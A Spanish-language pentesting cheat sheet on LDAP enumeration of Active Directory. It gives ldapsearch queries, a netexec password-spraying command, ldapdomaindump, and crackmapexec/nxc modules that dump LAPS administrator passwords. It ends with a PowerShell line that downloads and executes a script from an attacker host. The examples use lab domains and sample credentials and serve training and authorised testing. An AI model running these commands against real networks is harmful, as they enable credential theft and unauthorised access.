---
id: ldap
title: LDAP - 389,636,3268,3269
---

LDAP (Lightweight Directory Access Protocol) es el protocolo principal para consultar Active Directory. Permite extraer usuarios, grupos, equipos, políticas y otros objetos del directorio. Los puertos 389 (LDAP) y 636 (LDAPS) son los más comunes; 3268/3269 corresponden al Global Catalog.

## ldapsearch

Herramienta de línea de comandos para realizar consultas LDAP. Es la forma más directa de extraer información del directorio.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html#ldapsearch

> Flags principales:

```bash
-x Simple Authentication
-H LDAP Server
-D My User
-w My password
-b Base site, all data from here will be given
```

Verificar si se aceptan credenciales nulas o validar credenciales existentes:

```bash
ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>" ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
#Example
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "DC=vintage,DC=htb"
```

#### Extract **users**:

Extrae objetos de la OU de usuarios. Revela nombres, descripciones (a veces contienen contraseñas) y atributos de cuenta.

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
#Example
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "CN=Users,DC=vintage,DC=htb"
```

### Extract **computers**:

Enumera las cuentas de equipo del dominio. Útil para mapear la infraestructura.

```bash
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
```

```bash
#Example
ldapsearch -x -H ldap://10.10.11.45 -D "P.Rosa@vintage.htb" -w "Rosaisbest123" -b "CN=Computers,DC=vintage,DC=htb"
```

## [Password Spraying Attack](https://exploit-notes.hdks.org/exploit/database/mssql-pentesting/#password-spraying-attack)

Prueba una misma contraseña contra una lista de usuarios vía LDAP. `--no-bruteforce` evita bloqueos de cuenta al probar solo una contraseña por usuario.

```bash
netexec ldap sequel.htb -u users.grep -p 'MSSQLP@ssw0rd!' --no-bruteforce --continue-on-success
```

## ldapdomaindump

Volcado completo del dominio en formato HTML/JSON/grep. Genera archivos navegables con usuarios, grupos, políticas y más.

```bash
ldapdomaindump -u 'domain\user' -p 'pass' <IP>
```

```bash
ldapdomaindump -u 'domain\user' -p 'LM:NTML' <IP>
```

## crackmapexec

### Dumping LDAP Passwords

Extrae contraseñas LAPS (Local Administrator Password Solution) del atributo `ms-Mcs-AdmPwd` en AD.

> LAPS almacena la contraseña del administrador local de cada equipo en un atributo LDAP. Solo usuarios autorizados pueden leerlo.

```bash
crackmapexec ldap domain.domain -u user -p 'password' --kdcHost domain.domain -M laps
```


## NXC

NetExec (sucesor de CrackMapExec). Misma funcionalidad con desarrollo activo.

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --kdcHost pirate.htb -M laps
```

## Get-LAPSPasswords.ps1

Script de PowerShell para extraer contraseñas LAPS desde una máquina unida al dominio.

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.7/Get-LAPSPasswords.ps1')
Get-LAPSPasswords
```